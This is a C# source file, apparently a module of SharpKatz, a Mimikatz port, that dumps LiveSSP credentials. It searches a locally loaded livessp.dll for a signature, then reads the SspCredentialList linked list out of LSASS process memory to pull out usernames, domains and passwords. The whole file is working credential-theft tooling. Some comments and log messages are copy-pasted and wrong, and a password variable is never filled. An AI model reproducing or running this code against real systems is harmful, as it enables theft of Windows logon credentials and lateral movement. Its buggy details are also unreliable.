using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SharpKatz.Module
{
    class LiveSsp
    {

        static long max_search_size = 200000;

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_LIVESSP_LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public IntPtr unk1;
            public IntPtr unk2;
            public IntPtr unk3;
            public uint unk4;
            public uint unk5;
            public IntPtr unk6;
            public Natives.LUID LocallyUniqueIdentifier;
            public Natives.UNICODE_STRING UserName;
            public IntPtr unk7;
            public IntPtr suppCreds;//PKIWI_LIVESSP_PRIMARY_CREDENTIAL
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_LIVESSP_PRIMARY_CREDENTIAL
        {
            public int isSupp;
            public int unk0;
            public Msv1.KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
        }

        public static unsafe int FindCredentials<T>(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            KIWI_LIVESSP_LIST_ENTRY credentials;
            KIWI_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;

            long sspCredentialListSignOffset, sspCredentialListOffset;
            IntPtr sspCredentialListAddr;
            IntPtr liveLocal;
            IntPtr llCurrent;
            string passDecrypted = "";

            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
            liveLocal = Natives.LoadLibrary("livessp.dll");
            if (liveLocal == IntPtr.Zero)
            {
                Console.WriteLine("[x] Ssp Error: Could not load wdigest.dll into local process");
                return 1;
            }
            Console.WriteLine("[*] Ssp  Loaded msv1_0.dll at address {0:X}", liveLocal.ToInt64());

            byte[] tmpbytes = new byte[max_search_size];
            Marshal.Copy(liveLocal, tmpbytes, 0, (int)max_search_size);

            // Search for SspCredentialList signature within wdigest.dll and grab the offset
            sspCredentialListSignOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.SspCredentialListSign);
            if (sspCredentialListSignOffset == 0)
            {
                Console.WriteLine("[x] Ssp  Error: Could not find SspCredentialList signature\n");
                return 1;
            }
            Console.WriteLine("[*] Ssp  SspCredentialList offset found as {0}", sspCredentialListSignOffset);

            // Read memory offset to SspCredentialList from a "lea reg, [SspCredentialList]" asm
            IntPtr tmp_p = IntPtr.Add(msvMem, (int)sspCredentialListSignOffset + oshelper.LIVESSPLISTOFFSET);
            byte[] sspCredentialListOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            sspCredentialListOffset = BitConverter.ToInt32(sspCredentialListOffsetBytes, 0);

            // Read pointer at address to get the true memory location of SspCredentialList
            tmp_p = IntPtr.Add(msvMem, (int)sspCredentialListSignOffset + (int)sspCredentialListOffset);
            byte[] sspCredentialListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            sspCredentialListAddr = new IntPtr(BitConverter.ToInt64(sspCredentialListAddrBytes, 0));

            Console.WriteLine("[*] Ssp  SspCredentialList found at address {0:X}", sspCredentialListAddr.ToInt64());

            // Read first entry from linked list
            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, sspCredentialListAddr, Convert.ToUInt64(sizeof(KIWI_LIVESSP_LIST_ENTRY)));
            credentials = Utility.ReadStruct<KIWI_LIVESSP_LIST_ENTRY>(entryBytes);

            llCurrent = credentials.Flink;

            do
            {
                entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(sizeof(KIWI_LIVESSP_LIST_ENTRY)));
                credentials = Utility.ReadStruct<KIWI_LIVESSP_LIST_ENTRY>(entryBytes);

                //if (entry.UsageCount == 1)
                //{
                    IntPtr pUsername = IntPtr.Add(llCurrent, oshelper.USERNAME_OFFSET);
                    IntPtr pDomain = IntPtr.Add(llCurrent, oshelper.HOSTNAME_OFFSET);
                    IntPtr pPassword = IntPtr.Add(llCurrent, oshelper.PASSWORD_OFFSET);

                    string username = Utility.ExtractUnicodeStringString(hLsass, credentials.UserName);
                Natives.LUID luid = credentials.LocallyUniqueIdentifier;

                byte[] suppCredBytes = Utility.ReadFromLsass(ref hLsass, credentials.suppCreds, Convert.ToUInt64(sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL)));
                KIWI_LIVESSP_PRIMARY_CREDENTIAL suppCred = Utility.ReadStruct<KIWI_LIVESSP_PRIMARY_CREDENTIAL>(suppCredBytes);

                
                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                    {
                        

                        Credential.LiveSsp sspentry = new Credential.LiveSsp();

                    string user = Utility.ExtractUnicodeStringString(hLsass, suppCred.credentials.UserName);
                    string domain = Utility.ExtractUnicodeStringString(hLsass, suppCred.credentials.Domaine);
                    string password = Utility.ExtractUnicodeStringString(hLsass, suppCred.credentials.Password);

                    if (!string.IsNullOrEmpty(username))
                        {
                            sspentry.UserName = username;
                        }
                        else
                        {
                            sspentry.UserName = "[NULL]";
                        }

                        if (!string.IsNullOrEmpty(domain))
                        {
                            sspentry.DomainName = domain;
                        }
                        else
                        {
                            sspentry.DomainName = "[NULL]";
                        }

                        // Check if password is present
                        if (!string.IsNullOrEmpty(password))
                        {
                            sspentry.Password = passDecrypted;

                        }
                        else
                        {
                            sspentry.Password = "[NULL]";
                        }

                        Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid)
                            {
                                UserName = username,
                               // LiveSsp.Asspentry
                            };
                            logonlist.Add(currentlogon);
                        }
                        else
                        {
                            //currentlogon.LiveSsp = sspentry;
                        }
                    }
               // }

                llCurrent = credentials.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}
